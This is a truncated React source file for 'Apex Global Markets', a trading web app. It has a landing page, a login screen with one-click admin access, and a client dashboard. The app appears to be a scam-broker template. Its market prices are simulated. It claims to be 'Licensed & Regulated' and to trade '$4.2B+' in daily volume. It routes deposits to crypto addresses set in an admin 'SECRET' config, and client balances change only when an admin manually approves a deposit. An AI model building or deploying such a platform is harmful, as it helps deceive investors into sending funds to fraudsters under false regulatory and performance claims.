# Apex.global```react
import React, { useState, useEffect, useMemo, useRef } from 'react';
import { 
  LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, AreaChart, Area 
} from 'recharts';
import { 
  TrendingUp, TrendingDown, Wallet, ArrowUpRight, ArrowDownLeft, 
  Settings, Bell, Search, Menu, User, ShieldCheck, Zap, 
  LayoutDashboard, History, BarChart3, Globe, Shield, Lock, 
  ChevronRight, Camera, FileText, CheckCircle2, CreditCard, 
  ArrowRight, LogOut, Download, Upload, AlertCircle, Info,
  Cpu, Activity, Layers, Key, Users, Landmark, Terminal,
  MessageSquare, Send, Globe2, Copy, Plus, Trash2, 
  MoreHorizontal, ChevronDown, Monitor, Database, DollarSign,
  PieChart, Briefcase, Award, Headphones
} from 'lucide-react';

// --- PLATFORM BRANDING (Easily Changeable) ---
const BRAND_NAME = "APEX GLOBAL";
const BRAND_SUB = "MARKETS";

// --- MOCK DATABASE ---
const INITIAL_USERS = [
  { id: 'U-1001', name: 'James Wilson', email: 'j.wilson@apex.com', country: 'United Kingdom', status: 'Verified', tier: 'Pro', balance: 12500.00, joined: '2024-02-10' },
  { id: 'U-1002', name: 'Sophia Loren', email: 'sophia@lux.it', country: 'Italy', status: 'Pending', tier: 'Retail', balance: 0.00, joined: '2024-05-01' },
];

const INITIAL_ASSETS = [
  { id: 'btc', name: 'Bitcoin', symbol: 'BTC', price: 63240.50, change: 2.15 },
  { id: 'eth', name: 'Ethereum', symbol: 'ETH', price: 3410.20, change: -0.45 },
  { id: 'eurusd', name: 'EUR/USD', symbol: 'EUR/USD', price: 1.0845, change: 0.12 },
  { id: 'gold', name: 'Gold', symbol: 'XAU', price: 2315.80, change: 1.25 },
];

export default function App() {
  // --- CORE SYSTEM STATE ---
  const [appMode, setAppMode] = useState('landing'); // landing, auth, client, admin
  const [activeTab, setActiveTab] = useState('dashboard');
  const [users, setUsers] = useState(INITIAL_USERS);
  const [currentUser, setCurrentUser] = useState(INITIAL_USERS[1]); // Default to the new user
  const [transactions, setTransactions] = useState([]);
  const [marketPrices, setMarketPrices] = useState(INITIAL_ASSETS);
  const [notification, setNotification] = useState(null);
  const [isSidebarOpen, setIsSidebarOpen] = useState(true);

  // --- ADMIN "SECRET" CONFIGURATION ---
  const [adminConfig, setAdminConfig] = useState({
    btcAddress: 'bc1q6p6unm6j0yr8zqwry3z7kjqy5n5v8p8f2x2z2x',
    ethAddress: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    minDeposit: 500,
    platformStatus: 'Operational'
  });

  // --- ENGINE: PRICE SIMULATION ---
  useEffect(() => {
    const tick = setInterval(() => {
      setMarketPrices(prev => prev.map(p => ({
        ...p,
        price: p.price + (Math.random() - 0.5) * (p.price * 0.0005)
      })));
    }, 4000);
    return () => clearInterval(tick);
  }, []);

  const notify = (msg) => {
    setNotification(msg);
    setTimeout(() => setNotification(null), 4000);
  };

  // --- CLIENT ACTIONS ---
  const requestDeposit = (amount, asset) => {
    const newTx = {
      id: `TXN-${Math.floor(Math.random() * 90000 + 10000)}`,
      userId: currentUser.id,
      userName: currentUser.name,
      type: 'DEPOSIT',
      amount: parseFloat(amount),
      asset: asset,
      status: 'PENDING',
      timestamp: new Date().toLocaleString()
    };
    setTransactions([newTx, ...transactions]);
    notify("Deposit notification sent. Balance will update after confirmation.");
    setActiveTab('wallet');
  };

  // --- ADMIN ACTIONS ---
  const processTransaction = (txId, action) => {
    setTransactions(prev => prev.map(tx => {
      if (tx.id === txId && tx.status === 'PENDING') {
        if (action === 'APPROVE') {
          // Add money to user balance
          setUsers(uPrev => uPrev.map(u => u.id === tx.userId ? { ...u, balance: u.balance + tx.amount } : u));
          return { ...tx, status: 'SUCCESS' };
        }
        return { ...tx, status: 'REJECTED' };
      }
      return tx;
    }));
    notify(`Transaction ${txId} ${action === 'APPROVE' ? 'Approved' : 'Rejected'}`);
  };

  const handleVerifyUser = (userId) => {
    setUsers(prev => prev.map(u => u.id === userId ? { ...u, status: 'Verified' } : u));
    notify("Client Identity Verified");
  };

  // --- VIEWS ---

  // 1. PUBLIC LANDING PAGE
  const LandingView = () => (
    <div className="min-h-screen bg-[#050505] text-white">
      {/* Landing Nav */}
      <nav className="h-20 border-b border-white/5 flex items-center justify-between px-10 bg-black/50 backdrop-blur-xl sticky top-0 z-50">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 bg-emerald-500 rounded-lg flex items-center justify-center shadow-lg shadow-emerald-500/20">
            <Zap className="w-5 h-5 text-white" />
          </div>
          <span className="text-xl font-black tracking-tighter">{BRAND_NAME} <span className="text-emerald-500">{BRAND_SUB}</span></span>
        </div>
        <div className="flex gap-8 text-xs font-bold uppercase tracking-widest text-slate-400">
          <button className="hover:text-emerald-500 transition-colors">Markets</button>
          <button className="hover:text-emerald-500 transition-colors">Institutions</button>
          <button className="hover:text-emerald-500 transition-colors">Security</button>
        </div>
        <div className="flex gap-4">
          <button onClick={() => setAppMode('auth')} className="px-6 py-2 border border-white/10 rounded-lg text-xs font-bold hover:bg-white/5 transition-all">Sign In</button>
          <button onClick={() => setAppMode('auth')} className="px-6 py-2 bg-emerald-500 text-black rounded-lg text-xs font-bold hover:bg-emerald-400 transition-all">Register</button>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="py-24 px-10 max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16 items-center">
        <div className="space-y-8">
          <div className="inline-flex items-center gap-2 px-3 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full text-[10px] font-bold text-emerald-500 uppercase tracking-widest">
            Licensed & Regulated Brokerage
          </div>
          <h1 className="text-7xl font-black tracking-tighter leading-[0.9]">
            The Global Standard for <span className="text-emerald-500">Elite</span> Trading.
          </h1>
          <p className="text-slate-400 text-lg leading-relaxed">
            Access institutional liquidity with sub-millisecond execution. Trade Bitcoin, Forex, and Global Stocks from a single, high-security account.
          </p>
          <div className="flex gap-4">
            <button onClick={() => setAppMode('auth')} className="px-10 py-5 bg-emerald-500 text-black rounded-2xl font-black text-sm shadow-2xl shadow-emerald-500/20 active:scale-95 transition-all">Start Trading Now</button>
            <div className="flex items-center gap-4 px-6 border-l border-white/10 ml-4">
              <div>
                <p className="text-xl font-bold">$4.2B+</p>
                <p className="text-[10px] text-slate-500 uppercase font-bold">24h Volume</p>
              </div>
            </div>
          </div>
        </div>
        <div className="bg-emerald-500/5 border border-emerald-500/10 rounded-[3rem] p-8 shadow-2xl relative">
          <div className="absolute inset-0 bg-emerald-500/5 blur-3xl rounded-full"></div>
          <div className="relative z-10 space-y-6">
            <div className="flex justify-between items-center border-b border-white/5 pb-4">
              <span className="text-xs font-bold text-slate-400 uppercase">Live Pricing</span>
              <Activity className="w-4 h-4 text-emerald-500" />
            </div>
            {marketPrices.map(asset => (
              <div key={asset.id} className="flex justify-between items-center py-2">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center font-bold text-[10px]">{asset.symbol[0]}</div>
                  <span className="text-sm font-bold">{asset.symbol}/USD</span>
                </div>
                <div className="text-right font-mono">
                  <p className="text-sm font-bold">${asset.price.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                  <p className={`text-[10px] font-bold ${asset.change >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>{asset.change >= 0 ? '+' : ''}{asset.change.toFixed(2)}%</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Trust Section */}
      <section className="py-20 bg-white/5 border-y border-white/5 px-10">
        <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-4 gap-12 text-center">
          {[
            { icon: ShieldCheck, t: "Asset Security", d: "Tier-1 bank segregation for all client funds." },
            { icon: Globe, t: "Global Reach", d: "Trading access in 120+ countries." },
            { icon: Zap, t: "Ultra-Fast", d: "Order execution speeds under 0.1ms." },
            { icon: Headphones, t: "24/7 Support", d: "Dedicated account managers for Pro clients." }
          ].map((item, i) => (
            <div key={i} className="space-y-4">
              <item.icon className="w-8 h-8 text-emerald-500 mx-auto" />
              <h3 className="font-bold text-white">{item.t}</h3>
              <p className="text-xs text-slate-500">{item.d}</p>
            </div>
          ))}
        </div>
      </section>
    </div>
  );

  // 2. AUTH / LOGIN / REGISTRATION
  const AuthView = () => (
    <div className="min-h-screen bg-[#020202] flex items-center justify-center p-6 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-emerald-900/10 via-transparent to-transparent">
      <div className="w-full max-w-md space-y-8 animate-in fade-in zoom-in-95 duration-500">
        <div className="text-center space-y-4">
          <div className="w-16 h-16 bg-emerald-500 rounded-2xl mx-auto flex items-center justify-center shadow-2xl shadow-emerald-500/40 transform rotate-12">
            <Zap className="w-10 h-10 text-white fill-current" />
          </div>
          <h1 className="text-3xl font-black text-white tracking-tighter uppercase">{BRAND_NAME} <span className="text-emerald-500">{BRAND_SUB}</span></h1>
          <p className="text-slate-500 text-sm">Secure Institutional Access Portal</p>
        </div>

        <div className="bg-white/5 border border-white/10 p-10 rounded-[3rem] backdrop-blur-2xl shadow-2xl space-y-6">
          <div className="space-y-4">
            <div className="space-y-1">
              <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-1">Identity Token / Email</label>
              <input type="email" defaultValue="sophia@lux.it" className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all" />
            </div>
            <div className="space-y-1">
              <label className="text-[10px] font-bold text-slate-500 uppercase tracking-widest ml-1">Access Key</label>
              <input type="password" defaultValue="••••••••" className="w-full bg-white/5 border border-white/10 rounded-2xl py-4 px-6 text-white outline-none focus:ring-2 focus:ring-emerald-500/50 transition-all" />
            </div>
          </div>
          <div className="flex gap-4 pt-2">
            <button onClick={() => { setAppMode('client'); setActiveTab('dashboard'); notify("Welcome, Client Session Active"); }} className="flex-1 py-4 bg-emerald-500 hover:bg-emerald-400 text-black rounded-2xl font-black text-sm shadow-xl shadow-emerald-500/20 active:scale-95 transition-all">Client Portal</button>
            <button onClick={() => { setAppMode('admin'); setActiveTab('admin_dashboard'); notify("Administrative Override Active"); }} className="flex-1 py-4 bg-white/5 border border-white/10 text-white rounded-2xl font-bold text-sm hover:bg-white/10 transition-all active:scale-95">Admin Access</button>
          </div>
          <p className="text-[10px] text-center text-slate-600 font-bold uppercase tracking-tighter">Encrypted by 256-bit AES Standards</p>
        </div>
      </div>
    </div>
  );

  // 3. CLIENT: TERMINAL / WALLET
  const ClientView = () => (
    <div className="flex-1 flex flex-col">
      {activeTab === 'dashboard' && (
        <div className="p-10 max-w-6xl mx-auto space-y-10 animate-in fade-in duration-500">
          <div className="flex justify-between items-end">
            <div>
              <h1 className="text-4xl font-black text-white">Welcome, {currentUser.name}</h1>
              <p className="text-slate-500 text-sm mt-1">Status: {currentUser.status === 'Verified' ? 'Fully Verified' : 'Awaiting Identity Verification'}</p>
            </div>
            <div className="flex gap-3">
              <button onClick={() => setActiveTab('wallet')} className="px-6 py-2.5 bg-emerald-500 text-black font-black rounded-xl text-xs shadow-lg shadow-emerald-500/20">Manage Funds</button>
              <button onClick={() => setActiveTab('terminal')} className="px-6 py-2.5 bg-white/5 border border-white/10 text-white font-bold rounded-xl text-xs hover:bg-white/10">Trade Markets</button>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="bg-white/5 border border-white/10 p-8 rounded-[2.5rem] shadow-xl">
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Account Equity</p>
              <p className="text-3xl font-black text-white">${users.find(u=>u.id===currentUser.id).balance.toLocaleString()}</p>
              <div className="mt-4 flex items-center gap-2 text-emerald-500 text-[10px] font-bold">
                <TrendingUp className="w-3 h-3" /> +2.4% Today
              </div>
            </div>
            <div className="bg-white/5 border border-white/10 p-8 rounded-[2.5rem] shadow-xl">
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Active Margin</p>
              <p className="text-3xl font-black text-white">$0.00</p>
              <p className="text-[10px] text-slate-400 mt-4">Free Margin: 100%</p>
            </div>
            <div className="bg-white/5 border border-white/10 p-8 rounded-[2.5rem] shadow-xl">
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-widest mb-1">Account Tier</p>
              <p className="text-3xl font-black text-emerald-500 uppercase">{currentUser.tier}</p>
              <p className="text-[10px] text-slate-400 mt-4">Upgrade for lower fees</p>
            </div>
          </div>

          <div className="bg-white/5 border border-white/10 rounded-[3rem] p-10 flex flex-col md:flex-row items-center gap-12 overflow-hidden relative group">
             <div className="absolute inset-0 bg-emerald-500/5 blur-3xl opacity-0 group-hover:opacity-100 transition-opacity"></div>
             <div className="flex-1 space-y-6 relative z-10">
                <h2 className="text-3xl font-black text-white">Market Terminal v4.1</h2>
                <p className="text-slate-400 text-sm leading-relaxed">Experience sub-millisecond execution on over 40,000 instruments. Our direct market access (DMA) provides the tightest spreads in the industry.</p>
                <button onClick={() => setActiveTab('terminal')} className="px-8 py-3 bg-white text-black font-black rounded-xl text-xs hover:bg-slate-200 transition-all">Launch Enterprise Terminal</button>
             </div>
             <div className="w-full md:w-80 bg-black/40 backdrop-blur-xl border border-white/10 rounded-[2.5rem] p-8 shadow-2xl">
                <h3 className="text-[10px] font-bold text-slate-500 uppercase tracking-widest mb-6">Price Feed</h3>
                <div className="space-y-4">
                   {marketPrices.map(p => (
                     <div key={p.id} className="flex justify-between items-center">
                        <span className="text-xs font-bold text-white">{p.symbol}</span>
                        <div className="text-right">
                           <p className="text-xs font-mono font-bold text-white">${p.price.toLocaleString(undefined, {minimumFractionDigits: 2})}</p>
                           <p className={`text-[9px] font-bold ${p.change >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>{p.change >= 0 ? '+' : ''}{p.change.toFixed(2)}%</p>
                        </div>
                     </div>
                   ))}
                </div>
             </div>
          </div>
        </div>
      )}

      {activeTab === 'wallet' && (
        <div className="p-10 max-w-5xl mx-auto space-y-10 animate-in fade-in duration-500">
           <div className="grid grid-cols-1 md:grid-cols-12 gap-10">
              <div className="md:col-span-7 space-y-8">
                 <div className="bg-gradient-to-br from-emerald-600 to-teal-800 rounded-[3rem] p-12 text-white shadow-2xl relative overflow-hidden group">
                    <Zap className="absolute -right-10 -bottom-10 w-64 h-64 opacity-10 group-hover:scale-110 transition-transform duration-700" />
                    <div className="relative z-10">
                       <p className="text-emerald-100 text-[10px] font-bold uppercase tracking-widest mb-1">Consolidated Account Balance</p>
                       <h1 className="text-6xl font-black tracking-tighter mb-10">${users.find(u=>u.id===currentUser.id).balance.toLocaleString()} <span className="text-xl font-medium opacity-50">USD</span></h1>
                       <div className="flex gap-4">
                          <button className="bg-white text-emerald-700 px-8 py-3.5 rounded-2xl font-black text-sm shadow-xl hover:bg-slate-50 transition-all active:scale-95 flex items-center gap-2"><Upload className="w-4 h-4" /> Deposit</button>
                          <button className="bg-emerald-500/20 border border-white/20 text-white px-8 py-3.5 rounded-2xl font-black text-sm backdrop-blur-md hover:bg-emerald-500/30 transition-all flex items-center gap-2"><Download className="w-4 h-4" /> Withdraw</button>
                       </div>
                    </div>
                 </div>

                 <div className="bg-white/5 border border-white/10 rounded-[2.5rem] overflow-hidden">
                    <div className="px-8 py-6 border-b border-white/5 flex justify-between items-center bg-white/[0.02]">
                       <h3 className="font-bold text-white text-sm">Transaction Ledger</h3>
                       <History className="w-4 h-4 text-slate-500" />
                    </div>
                    <div className="divide-y divide-white/5">
                       {transactions.filter(tx => tx.userId === currentUser.id).length === 0 ? (
                         <div className="p-12 text-center text-slate-600 text-xs italic">No transactions found in this audit period.</div>
                       ) : (
                         transactions.filter(tx => tx.userId === currentUser.id).map(tx => (
                           <div key={tx.id} className="p-8 flex items-center justify-between hover:bg-white/[0.01]">
                              <div className="flex items-center gap-5">
                                 <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${tx.status === 'SUCCESS' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-amber-500/10 text-amber-500'}`}>
                                    {tx.type === 'DEPOSIT' ? <ArrowDownLeft className="w-6 h-6" /> : <ArrowUpRight className="w-6 h-6" />}
                                 </div>
                                 <div>
                                    <p className="font-black text-white text-sm uppercase tracking-tight">{tx.type} • {tx.asset}</p>
                                    <p className="
